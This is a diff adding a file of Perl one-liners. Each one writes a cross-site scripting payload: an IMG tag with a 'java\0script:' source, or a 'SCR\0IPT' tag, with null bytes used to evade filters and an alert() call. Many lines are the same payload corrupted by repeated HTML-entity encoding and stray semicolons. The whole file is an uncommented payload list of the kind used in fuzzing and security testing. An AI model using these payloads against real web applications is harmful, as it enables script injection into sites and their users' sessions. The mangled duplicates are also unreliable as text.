@@ -1,0 +1,27 @@
+perl -e &#039;print \";<;IMG SRC=java\0script:alert(1932)>;\";;&#039; >; out
+perl -e &#039;print \";<;IMG SRC=java\0script:alert(\";XSS\";)>;\";;&#039; >; out
+perl -e &#039;print \&quot;&lt;IMG SRC=java\0script:alert(1863)&gt;\&quot;;&#039; &gt; out
+perl -e &#039;print \&quot;&lt;IMG SRC=java\0script:alert(\&quot;XSS\&quot;)&gt;\&quot;;&#039; &gt; out
+perl -e &#039;print \&quot;&lt;SCR\0IPT&gt;alert(1864)&lt;/SCR\0IPT&gt;\&quot;;&#039; &gt; out
+perl -e &#039;print \&quot;&lt;SCR\0IPT&gt;alert(\&quot;XSS\&quot;)&lt;/SCR\0IPT&gt;\&quot;;&#039; &gt; out
+perl -e &#039;print \";<;SCR\0IPT>;alert(1933)<;/SCR\0IPT>;\";;&#039; >; out
+perl -e &#039;print \";<;SCR\0IPT>;alert(\";XSS\";)<;/SCR\0IPT>;\";;&#039; >; out
+perl -e &apos;print &quot;&amp;&lt;SCR\0IPT&gt;alert(1852)&lt;/SCR\0IPT&gt;&quot;;&apos; &gt; out
+perl -e &apos;print &quot;&amp;&lt;SCR\0IPT&gt;alert(&quot;XSS&quot;)&lt;/SCR\0IPT&gt;&quot;;&apos; &gt; out
+perl -e &apos;print &quot;&lt;IMG SRC=java\0script:alert(1851)>&quot;;&apos;&gt; out
+perl -e &apos;print &quot;&lt;IMG SRC=java\0script:alert(&quot;XSS&quot;)>&quot;;&apos;&gt; out
+perl -e 'print "<IMG SRC=java\0script:alert(1644)>";' > out
+perl -e 'print \"<IMG SRC=java\0script:alert(1755)>\";' > out
+perl -e 'print "<IMG SRC=java\0script:alert(730)>";' > out
+perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
+perl -e 'print \"<IMG SRC=java\0script:alert(\"XSS\")>\";' > out
+perl -e ';print ";<;IM SRC=java\0script:alert(1920)>";;';>; out
+perl -e ';print ";<;IM SRC=java\0script:alert(";XSS";)>";;';>; out
+perl -e 'print \"&lt;IMG SRC=java\0script&#058;alert(921)&gt;\";' &gt; out
+perl -e 'print \"&lt;IMG SRC=java\0script&#058;alert(\\"XSS\\")&gt;\";' &gt; out
+perl -e 'print \"&lt;SCR\0IPT&gt;alert(920)&lt;/SCR\0IPT&gt;\";' &gt; out
+perl -e 'print \"&lt;SCR\0IPT&gt;alert(\\"XSS\\")&lt;/SCR\0IPT&gt;\";' &gt; out
+perl -e 'print \"<SCR\0IPT>alert(1754)</SCR\0IPT>\";' > out
+perl -e ';print ";&;<;SCR\0IPT>;alert(1921)<;/SCR\0IPT>;";;'; >; out
+perl -e ';print ";&;<;SCR\0IPT>;alert(";XSS";)<;/SCR\0IPT>;";;'; >; out
+perl -e 'print \"<SCR\0IPT>alert(\"XSS\")</SCR\0IPT>\";' > out
